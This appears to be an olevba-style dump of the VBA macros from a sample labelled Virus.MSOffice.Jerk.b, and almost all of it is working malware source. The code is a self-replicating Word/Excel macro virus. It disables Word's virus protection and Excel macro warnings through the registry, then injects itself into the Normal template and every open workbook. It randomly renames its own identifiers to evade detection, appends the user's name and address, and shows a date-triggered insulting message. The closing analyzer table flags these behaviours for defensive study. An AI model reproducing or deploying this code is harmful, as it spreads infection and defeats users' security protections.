If VEJWDG = ZCZLQJQHTMKY Then NormalTemplate.Save
End If
FDJMUHIQSWTATK = Mid(ActiveDocument.FullName, 2, GMQATL)
If MJODT = ZCZLQJQHTMKY And (FDJMUHIQSWTATK = ZHFRIMGWHH Or ActiveDocument.Saved = DAOGHJCAC) Then
OGZXTPHIPQQ = ActiveDocument.Saved
EEQRPDG = VQAQBVFHUQ.CodeModule.Lines(GMQATL, VQAQBVFHUQ.CodeModule.CountOfLines)
Call FKDJUVTV(EEQRPDG)
OZBWWGT.CodeModule.InsertLines GMQATL, EEQRPDG
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then ActiveDocument.Save
End If
End If
End Sub
Private Sub YPQVPZNASUFFVS(ByRef EEQRPDG As String)
On Error Resume Next
Const QIFRBCAZYANQS = 48, PAJIPWJXOHR = 15, TANEYWDERUD = 5, JOVHDK = 65, QJCZV = 90, GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False
Dim KNPDNRGGCNVE, MQLWPEJIQGYUATmp, QOIJHY, MQLWPEJIQGYUA(GMQATL To QIFRBCAZYANQS), MQLWPEJIQGYUA2(GMQATL To QIFRBCAZYANQS) As String
Dim UXYIMEIWANP, GNXRKJLB, UWZPCBHDLHWS As Integer
Dim HDUMVDDNOOD As Boolean
KNPDNRGGCNVE = "EEQRPDG QIFRBCAZYANQS MQLWPEJIQGYUA MQLWPEJIQGYUA2 QOIJHY UXYIMEIWANP GNXRKJLB UWZPCBHDLHWS HDUMVDDNOOD YPQVPZNASUFFVS PAJIPWJXOHR TANEYWDERUD JOVHDK QJCZV GMQATL KNPDNRGGCNVE MQLWPEJIQGYUATmp OGZXTPHIPQQ VEJWDG OOWJIBBZ MJODT OZBWWGT VQAQBVFHUQ JJPGKBNVXZNSCME NPCJIRMM TBQJJOHPNT EBNWT QSCJXIFKUSDSAAK NPCJIRMMTmp OMMILKJBJRNVP FBDLSJBEB FDJMUHIQSWTATK ZCZLQJQHTMKY DAOGHJCAC OYUUUTFBKVJTCOC XZHDC FYADBWHMSYHYX YGPINVKPWHNU CUDQIAAGVQEHSIE ZHFRIMGWHH ESFUL BAYWEHFPE NMOSYIAVKTPWLM NLOYDEC FKDJUVTV KPDOQFIA INFBRLRBOG CMRILYFMYPUGI"
Randomize
GNXRKJLB = GMQATL
For UXYIMEIWANP = GMQATL To Len(KNPDNRGGCNVE)
If Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL) = " " Or UXYIMEIWANP = Len(KNPDNRGGCNVE) Then
If UXYIMEIWANP = Len(KNPDNRGGCNVE) Then MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
For UWZPCBHDLHWS = GMQATL To Int((PAJIPWJXOHR - TANEYWDERUD + GMQATL) * Rnd + TANEYWDERUD)
MQLWPEJIQGYUA2(GNXRKJLB) = MQLWPEJIQGYUA2(GNXRKJLB) & Chr(Int((QJCZV - JOVHDK + GMQATL) * Rnd + JOVHDK))
Next UWZPCBHDLHWS
MQLWPEJIQGYUA(GNXRKJLB) = MQLWPEJIQGYUATmp
MQLWPEJIQGYUATmp = ""
GNXRKJLB = GNXRKJLB + GMQATL
Else
MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
End If
Next UXYIMEIWANP
HDUMVDDNOOD = DAOGHJCAC
For UXYIMEIWANP = GMQATL To Len(EEQRPDG)
For GNXRKJLB = GMQATL To QIFRBCAZYANQS
If Mid(EEQRPDG, UXYIMEIWANP, Len(MQLWPEJIQGYUA(GNXRKJLB))) = MQLWPEJIQGYUA(GNXRKJLB) Then
QOIJHY = QOIJHY & MQLWPEJIQGYUA2(GNXRKJLB)
UXYIMEIWANP = UXYIMEIWANP + Len(MQLWPEJIQGYUA(GNXRKJLB)) - GMQATL
HDUMVDDNOOD = ZCZLQJQHTMKY
Exit For
End If
Next GNXRKJLB
If HDUMVDDNOOD = DAOGHJCAC Then
QOIJHY = QOIJHY & Mid(EEQRPDG, UXYIMEIWANP, GMQATL)
Else
HDUMVDDNOOD = DAOGHJCAC
End If
Next UXYIMEIWANP
EEQRPDG = QOIJHY
End Sub
Private Sub JJPGKBNVXZNSCME(ByRef EEQRPDG As String)
On Error Resume Next
Const QSCJXIFKUSDSAAK = "' ", GMQATL = 1
Const YGPINVKPWHNU = "hh:mm:ss: AMPM - ", CUDQIAAGVQEHSIE = "dddd, d mmm yyyy"
Dim NPCJIRMMTmp, NPCJIRMM, OMMILKJBJRNVP, FBDLSJBEB, TBQJJOHPNT, EBNWT As String
Dim UXYIMEIWANP As Integer
TBQJJOHPNT = Chr(10 * GMQATL + 3)
NPCJIRMM = Application.UserAddress
FBDLSJBEB = Format(Time, YGPINVKPWHNU) & Format(Date, CUDQIAAGVQEHSIE)
EBNWT = Chr(GMQATL * 10)
OMMILKJBJRNVP = Application.UserName
For UXYIMEIWANP = GMQATL To Len(NPCJIRMM)
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> TBQJJOHPNT Then
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> EBNWT Then
NPCJIRMMTmp = NPCJIRMMTmp & Mid(NPCJIRMM, UXYIMEIWANP, GMQATL)
End If
Else
NPCJIRMMTmp = NPCJIRMMTmp & TBQJJOHPNT & QSCJXIFKUSDSAAK
End If
Next UXYIMEIWANP
EEQRPDG = EEQRPDG & TBQJJOHPNT & QSCJXIFKUSDSAAK & FBDLSJBEB & TBQJJOHPNT & QSCJXIFKUSDSAAK & OMMILKJBJRNVP & TBQJJOHPNT & QSCJXIFKUSDSAAK & NPCJIRMM & TBQJJOHPNT
End Sub
Private Sub FKDJUVTV(ByVal EEQRPDG As String)
On Error Resume Next
Dim CMRILYFMYPUGI As Long
Dim ESFUL As Object
Dim KPDOQFIA, INFBRLRBOG As String
KPDOQFIA = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
CMRILYFMYPUGI = &H0
INFBRLRBOG = "Options6"
System.PrivateProfileString("", KPDOQFIA, INFBRLRBOG) = CMRILYFMYPUGI
Set ESFUL = GetObject(, "Excel.Application")
Const GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
NMOSYIAVKTPWLM = "ThisWorkbook"
For UXYIMEIWANP = GMQATL To ESFUL.Application.Workbooks.Count
For GNXRKJLB = GMQATL To ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine 33 * GMQATL, "Private Sub Workbook_Deactivate()"
Else
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
Next UXYIMEIWANP
Set ESFUL = Nothing
End Sub
Private Sub NLOYDEC(ByVal EEQRPDG As String)
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim BAYWEHFPE As Object
Dim VEJWDG As Boolean
Set BAYWEHFPE = GetObject(, "Word.Application")
If BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
VEJWDG = BAYWEHFPE.NormalTemplate.Saved
BAYWEHFPE.Options.VirusProtection = DAOGHJCAC
BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then BAYWEHFPE.NormalTemplate.Save
End If
Set BAYWEHFPE = Nothing
End Sub

' 01:28:26: PM - Wednesday, 10 Feb 1999
' Avert
'


-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Jerk.b-7448dc8151169868f07351f0057dc645a5138ef2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Worksheet_Deactivate()
On Error Resume Next
Const GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0
Dim EEQRPDG, NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
Dim OGZXTPHIPQQ As Boolean
NMOSYIAVKTPWLM = "ThisWorkbook"
EEQRPDG = Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines)
Call NLOYDEC(EEQRPDG)
For UXYIMEIWANP = GMQATL To Application.Workbooks.Count
OGZXTPHIPQQ = DAOGHJCAC
For GNXRKJLB = GMQATL To Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
If Application.Workbooks.Item(UXYIMEIWANP).Path <> "" And Application.Workbooks.Item(UXYIMEIWANP).Saved = ZCZLQJQHTMKY And OGZXTPHIPQQ = DAOGHJCAC Then OGZXTPHIPQQ = ZCZLQJQHTMKY
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then Application.Workbooks.Item(UXYIMEIWANP).Save
Next UXYIMEIWANP
End Sub
Private Sub Document_Close()
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0, GMQATL = 1, XZHDC = wdFormatDocument, FYADBWHMSYHYX = wdFormatTemplate, ZHFRIMGWHH = ":"
Dim OGZXTPHIPQQ, VEJWDG, OOWJIBBZ, MJODT As Boolean
Dim OZBWWGT, VQAQBVFHUQ As Object
Dim FDJMUHIQSWTATK, EEQRPDG As String
If Month(GMQATL * Now) > GMQATL * 2 + GMQATL * 3 And Day(GMQATL * Now) = 4 + GMQATL * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set OZBWWGT = ActiveDocument.VBProject.VBComponents.Item(GMQATL)
Set VQAQBVFHUQ = NormalTemplate.VBProject.VBComponents.Item(GMQATL)
Randomize
OOWJIBBZ = DAOGHJCAC
MJODT = DAOGHJCAC
If OZBWWGT.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then OOWJIBBZ = ZCZLQJQHTMKY
If VQAQBVFHUQ.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then MJODT = ZCZLQJQHTMKY
Options.VirusProtection = DAOGHJCAC
If (OOWJIBBZ = ZCZLQJQHTMKY Xor MJODT = ZCZLQJQHTMKY) And (ActiveDocument.SaveFormat = XZHDC Or ActiveDocument.SaveFormat = FYADBWHMSYHYX) Then
If OOWJIBBZ = ZCZLQJQHTMKY Then
VEJWDG = NormalTemplate.Saved
EEQRPDG = OZBWWGT.CodeModule.Lines(GMQATL, OZBWWGT.CodeModule.CountOfLines)
Call JJPGKBNVXZNSCME(EEQRPDG)
If Int(Rnd * 10 * GMQATL) = GMQATL * 7 Then Call YPQVPZNASUFFVS(EEQRPDG)
Call FKDJUVTV(EEQRPDG)
VQAQBVFHUQ.CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then NormalTemplate.Save
End If
FDJMUHIQSWTATK = Mid(ActiveDocument.FullName, 2, GMQATL)
If MJODT = ZCZLQJQHTMKY And (FDJMUHIQSWTATK = ZHFRIMGWHH Or ActiveDocument.Saved = DAOGHJCAC) Then
OGZXTPHIPQQ = ActiveDocument.Saved
EEQRPDG = VQAQBVFHUQ.CodeModule.Lines(GMQATL, VQAQBVFHUQ.CodeModule.CountOfLines)
Call FKDJUVTV(EEQRPDG)
OZBWWGT.CodeModule.InsertLines GMQATL, EEQRPDG
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then ActiveDocument.Save
End If
End If
End Sub
Private Sub YPQVPZNASUFFVS(ByRef EEQRPDG As String)
On Error Resume Next
Const QIFRBCAZYANQS = 48, PAJIPWJXOHR = 15, TANEYWDERUD = 5, JOVHDK = 65, QJCZV = 90, GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False
Dim KNPDNRGGCNVE, MQLWPEJIQGYUATmp, QOIJHY, MQLWPEJIQGYUA(GMQATL To QIFRBCAZYANQS), MQLWPEJIQGYUA2(GMQATL To QIFRBCAZYANQS) As String
Dim UXYIMEIWANP, GNXRKJLB, UWZPCBHDLHWS As Integer
Dim HDUMVDDNOOD As Boolean
KNPDNRGGCNVE = "EEQRPDG QIFRBCAZYANQS MQLWPEJIQGYUA MQLWPEJIQGYUA2 QOIJHY UXYIMEIWANP GNXRKJLB UWZPCBHDLHWS HDUMVDDNOOD YPQVPZNASUFFVS PAJIPWJXOHR TANEYWDERUD JOVHDK QJCZV GMQATL KNPDNRGGCNVE MQLWPEJIQGYUATmp OGZXTPHIPQQ VEJWDG OOWJIBBZ MJODT OZBWWGT VQAQBVFHUQ JJPGKBNVXZNSCME NPCJIRMM TBQJJOHPNT EBNWT QSCJXIFKUSDSAAK NPCJIRMMTmp OMMILKJBJRNVP FBDLSJBEB FDJMUHIQSWTATK ZCZLQJQHTMKY DAOGHJCAC OYUUUTFBKVJTCOC XZHDC FYADBWHMSYHYX YGPINVKPWHNU CUDQIAAGVQEHSIE ZHFRIMGWHH ESFUL BAYWEHFPE NMOSYIAVKTPWLM NLOYDEC FKDJUVTV KPDOQFIA INFBRLRBOG CMRILYFMYPUGI"
Randomize
GNXRKJLB = GMQATL
For UXYIMEIWANP = GMQATL To Len(KNPDNRGGCNVE)
If Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL) = " " Or UXYIMEIWANP = Len(KNPDNRGGCNVE) Then
If UXYIMEIWANP = Len(KNPDNRGGCNVE) Then MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
For UWZPCBHDLHWS = GMQATL To Int((PAJIPWJXOHR - TANEYWDERUD + GMQATL) * Rnd + TANEYWDERUD)
MQLWPEJIQGYUA2(GNXRKJLB) = MQLWPEJIQGYUA2(GNXRKJLB) & Chr(Int((QJCZV - JOVHDK + GMQATL) * Rnd + JOVHDK))
Next UWZPCBHDLHWS
MQLWPEJIQGYUA(GNXRKJLB) = MQLWPEJIQGYUATmp
MQLWPEJIQGYUATmp = ""
GNXRKJLB = GNXRKJLB + GMQATL
Else
MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
End If
Next UXYIMEIWANP
HDUMVDDNOOD = DAOGHJCAC
For UXYIMEIWANP = GMQATL To Len(EEQRPDG)
For GNXRKJLB = GMQATL To QIFRBCAZYANQS
If Mid(EEQRPDG, UXYIMEIWANP, Len(MQLWPEJIQGYUA(GNXRKJLB))) = MQLWPEJIQGYUA(GNXRKJLB) Then
QOIJHY = QOIJHY & MQLWPEJIQGYUA2(GNXRKJLB)
UXYIMEIWANP = UXYIMEIWANP + Len(MQLWPEJIQGYUA(GNXRKJLB)) - GMQATL
HDUMVDDNOOD = ZCZLQJQHTMKY
Exit For
End If
Next GNXRKJLB
If HDUMVDDNOOD = DAOGHJCAC Then
QOIJHY = QOIJHY & Mid(EEQRPDG, UXYIMEIWANP, GMQATL)
Else
HDUMVDDNOOD = DAOGHJCAC
End If
Next UXYIMEIWANP
EEQRPDG = QOIJHY
End Sub
Private Sub JJPGKBNVXZNSCME(ByRef EEQRPDG As String)
On Error Resume Next
Const QSCJXIFKUSDSAAK = "' ", GMQATL = 1
Const YGPINVKPWHNU = "hh:mm:ss: AMPM - ", CUDQIAAGVQEHSIE = "dddd, d mmm yyyy"
Dim NPCJIRMMTmp, NPCJIRMM, OMMILKJBJRNVP, FBDLSJBEB, TBQJJOHPNT, EBNWT As String
Dim UXYIMEIWANP As Integer
TBQJJOHPNT = Chr(10 * GMQATL + 3)
NPCJIRMM = Application.UserAddress
FBDLSJBEB = Format(Time, YGPINVKPWHNU) & Format(Date, CUDQIAAGVQEHSIE)
EBNWT = Chr(GMQATL * 10)
OMMILKJBJRNVP = Application.UserName
For UXYIMEIWANP = GMQATL To Len(NPCJIRMM)
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> TBQJJOHPNT Then
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> EBNWT Then
NPCJIRMMTmp = NPCJIRMMTmp & Mid(NPCJIRMM, UXYIMEIWANP, GMQATL)
End If
Else
NPCJIRMMTmp = NPCJIRMMTmp & TBQJJOHPNT & QSCJXIFKUSDSAAK
End If
Next UXYIMEIWANP
EEQRPDG = EEQRPDG & TBQJJOHPNT & QSCJXIFKUSDSAAK & FBDLSJBEB & TBQJJOHPNT & QSCJXIFKUSDSAAK & OMMILKJBJRNVP & TBQJJOHPNT & QSCJXIFKUSDSAAK & NPCJIRMM & TBQJJOHPNT
End Sub
Private Sub FKDJUVTV(ByVal EEQRPDG As String)
On Error Resume Next
Dim CMRILYFMYPUGI As Long
Dim ESFUL As Object
Dim KPDOQFIA, INFBRLRBOG As String
KPDOQFIA = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
CMRILYFMYPUGI = &H0
INFBRLRBOG = "Options6"
System.PrivateProfileString("", KPDOQFIA, INFBRLRBOG) = CMRILYFMYPUGI
Set ESFUL = GetObject(, "Excel.Application")
Const GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
NMOSYIAVKTPWLM = "ThisWorkbook"
For UXYIMEIWANP = GMQATL To ESFUL.Application.Workbooks.Count
For GNXRKJLB = GMQATL To ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine 33 * GMQATL, "Private Sub Workbook_Deactivate()"
Else
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
Next UXYIMEIWANP
Set ESFUL = Nothing
End Sub
Private Sub NLOYDEC(ByVal EEQRPDG As String)
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim BAYWEHFPE As Object
Dim VEJWDG As Boolean
Set BAYWEHFPE = GetObject(, "Word.Application")
If BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
VEJWDG = BAYWEHFPE.NormalTemplate.Saved
BAYWEHFPE.Options.VirusProtection = DAOGHJCAC
BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then BAYWEHFPE.NormalTemplate.Save
End If
Set BAYWEHFPE = Nothing
End Sub

' 01:28:26: PM - Wednesday, 10 Feb 1999
' Avert
'


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

